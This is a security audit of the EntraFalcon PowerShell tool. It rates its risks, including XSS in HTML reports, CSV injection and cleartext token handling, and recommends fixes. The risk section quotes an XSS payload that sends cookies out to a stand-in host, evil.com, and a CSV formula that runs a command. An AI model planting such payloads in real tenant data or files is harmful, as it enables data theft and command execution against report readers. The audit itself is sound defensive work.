# EntraFalcon Formal Security Analysis

This document provides a formal security analysis of the EntraFalcon tool, assessing its secure-by-design properties, identifying risk areas, and providing prioritized recommendations.

---

## Secure-by-Design Assessment

### Positive Security Properties

EntraFalcon demonstrates reasonable security awareness in several areas:

**Authentication Security:**

- **PKCE by default**: The Authorization Code flow generates a cryptographic code verifier (43-128 random characters) and derives an S256 code challenge. PKCE is enabled by default and must be explicitly disabled via `-DisablePKCE`. This prevents authorization code interception attacks.
- **OAuth state parameter validation**: A 12-byte random state parameter is generated per authentication request and validated against the response from the identity provider. Mismatched states cause the flow to abort with an explicit error.
- **Refresh token format validation**: Before use, the `-BroCiToken` parameter is validated to ensure it starts with `1.` (expected for Azure refresh tokens) and does not start with `ey` (JWT access tokens). This prevents accidental misuse.
- **CAE support**: Continuous Access Evaluation is enabled by default, providing near-real-time token revocation capabilities. It can be disabled via `-DisableCAE` for compatibility.

**Runtime Hygiene:**

- **Global variable cleanup**: The `Start-CleanUp` function removes all 26+ global variables on normal script exit, including all token objects. This reduces the window of token exposure in interactive sessions.
- **Token expiration monitoring**: All API calls check token expiration with a 30-minute buffer and automatically refresh before making requests.

**Transparency:**

- **XSS limitation acknowledged in README**: The authors explicitly acknowledge the XSS risk in HTML reports.
- **Default UserAgent is identifiable**: The default value `EntraFalcon` makes the tool visible in sign-in logs, supporting responsible use.

### Negative Security Properties

**Token Management:**

- Tokens are stored as cleartext PowerShell objects in global scope variables. Any code running in the same PowerShell session can access them.
- No use of `SecureString`, DPAPI, or any encryption mechanism for token storage.
- If the script crashes or is forcibly terminated, `Start-CleanUp` does not execute and tokens persist in the session.

**Output Protection:**

- No encryption, access control, or integrity protection on output files.
- Output files are created with inherited parent directory permissions.
- Sensitive tenant data is written in cleartext to HTML, TXT, and CSV files.

**Input Sanitization:**

- No HTML entity encoding for tenant-derived data rendered in reports.
- No CSV formula injection prevention in CSV exports.
- No schema validation of API responses; all response data is trusted.

**Parameter Security:**

- The `-BroCiToken` parameter is a plaintext string visible in process listings and shell history.
- No warning is displayed about shell history exposure when using this parameter.

**API Response Integrity:**

- Batch response IDs are trusted without independent verification.
- No validation that API response schemas match expected structures.
- Pagination links from API responses are followed without domain validation (though they originate from `graph.microsoft.com` responses over HTTPS).

---

## Risk Areas

### CRITICAL: XSS in HTML Reports from Unsanitized Tenant Data

**Description:** HTML reports embed tenant-controlled data (display names, descriptions, UPNs, group membership rules, finding details) as JSON that is deserialized and rendered into HTML table cells via JavaScript. An attacker who controls any display name in the tenant can inject JavaScript that executes when an administrator opens the report in a browser.

**Attack Scenario:** An attacker creates a user account or group with a display name containing a script payload (e.g., `<img src=x onerror=fetch('https://evil.com/steal?cookie='+document.cookie)>`). When the security report is generated and opened, the payload executes in the context of the report viewer's browser.

**Impact:** The report viewer's browser context is compromised. While the reports are static HTML files (no session cookies to steal from a server), the attacker could:
- Modify the report content to hide malicious findings.
- Exfiltrate report data (containing sensitive tenant information) to an external server.
- Redirect the viewer to a phishing page.

**Likelihood:** Medium. Requires the attacker to have the ability to set display names in the tenant (e.g., via self-service profile editing, guest account creation, or compromised admin credentials).

### HIGH: CSV Injection in Exported CSV Data

**Description:** CSV export is performed client-side in JavaScript by extracting visible table data and constructing a downloadable CSV file. No sanitization is applied to cell values.

**Attack Scenario:** An attacker sets a display name or description starting with `=`, `+`, `-`, or `@` (e.g., `=CMD|'/C calc'!A0`). When the CSV is exported and opened in Excel, the formula is executed.

**Impact:** Arbitrary command execution on the machine of the person opening the CSV in Excel (subject to Excel's security warnings, which users often dismiss).

**Likelihood:** Medium. Same prerequisite as XSS (ability to set display names), and requires the victim to export to CSV and open in Excel.

### MEDIUM: Cleartext Token Storage in Memory

**Description:** All access and refresh tokens are stored as cleartext strings in PowerShell global variables for the duration of the script execution.

**Impact:** Any process running as the same user can read global variables from the PowerShell session. If the script crashes, tokens persist until the session is closed.

**Likelihood:** Low in normal assessment scenarios. This is an accepted trade-off for a security assessment tool that runs in a controlled environment.

**Mitigation Status:** Partially mitigated by `Start-CleanUp` on normal exit.

### MEDIUM: BroCiToken Visible in Command Line / Shell History

**Description:** The `-BroCiToken` parameter accepts a refresh token as a plaintext command-line argument. This value is visible in process listings and is recorded in shell history.

**Impact:** An attacker with read access to process listings or shell history can obtain a valid refresh token, potentially gaining persistent access to the target tenant.

**Likelihood:** Medium in multi-user environments; Low on single-user assessment workstations.

### LOW: Clipboard Exposure of Auth URLs and Codes

**Description:** The ManualCode flow writes authentication URLs to the clipboard and reads authorization codes from the clipboard. The DeviceCode flow writes user codes to the clipboard.

**Impact:** Other applications running on the same desktop can read clipboard contents. Windows clipboard history may retain these values.

**Likelihood:** Low. Authorization codes are single-use and short-lived. Device codes expire after 15 minutes.

### LOW: Output Files with No Access Controls

**Description:** Report files are created with default file system permissions inherited from the parent directory. No explicit access controls are set.

**Impact:** Other users on the same system may be able to read sensitive tenant data from the reports.

**Likelihood:** Low in typical assessment scenarios where the assessor controls the workstation.

### INFO: Configurable UserAgent Could Be Used for Impersonation

**Description:** The `-UserAgent` parameter allows setting an arbitrary User-Agent header, which could be used to impersonate legitimate tools in network logs.

**Impact:** Minimal direct security impact on the tool itself. Relevant for detection and response teams monitoring for unauthorized enumeration.

**Likelihood:** Not a vulnerability in the tool; rather, a feature that could be misused.

---

## Recommendations

### Priority 1: Implement HTML Entity Encoding

Apply HTML entity encoding to all tenant-derived data before rendering in reports. This should be implemented in the JavaScript rendering layer (the `GLOBALJavaScript_Table` code in `shared_Functions.psm1`) to ensure all values are escaped before insertion into the DOM.

The encoding function should at minimum convert:
- `<` to `&lt;`
- `>` to `&gt;`
- `"` to `&quot;`
- `'` to `&#39;`
- `&` to `&amp;`

Prefer using `textContent` over `innerHTML` for all data-driven DOM updates.

### Priority 2: Add CSV Sanitization

Prefix CSV cell values that begin with `=`, `+`, `-`, or `@` with a tab character or single quote to prevent formula interpretation in spreadsheet applications. This should be implemented in the client-side JavaScript CSV export function.

### Priority 3: Consider SecureString for BroCiToken

Change the `-BroCiToken` parameter type from `[string]` to `[SecureString]` to prevent the value from appearing in plaintext in process listings. Convert internally as needed. Alternatively, accept the token from a file or environment variable rather than a command-line parameter.

### Priority 4: Add Shell History Warning

When `-BroCiToken` is used, display a warning message advising the user to clear their shell history after the run completes:
- PowerShell: `Clear-History` and `(Get-PSReadlineOption).HistorySavePath`
- Bash: `history -c && history -w`
- Fish: `builtin history clear`

### Priority 5: Document the Trust Boundary

Add explicit documentation describing the trust boundary between tenant data (untrusted) and report rendering (trusted context). Advise report viewers to:
- Open reports only from tenants they trust.
- Open reports in a browser with JavaScript disabled if tenant data integrity is uncertain.
- Verify report integrity before sharing with stakeholders.
